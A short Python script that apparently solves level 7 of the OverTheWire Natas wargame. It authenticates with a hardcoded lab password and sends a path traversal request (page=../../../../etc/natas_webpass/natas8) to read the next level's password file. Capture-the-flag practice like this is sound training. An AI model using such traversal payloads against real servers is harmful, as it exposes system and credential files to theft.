import requests

username = "natas7"
password = "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"

url = "http://%s.natas.labs.overthewire.org?page=../../../../etc/natas_webpass/natas8" % username
session = requests.Session()

response = session.get(url, auth = (username,password))


print response.headers,response.text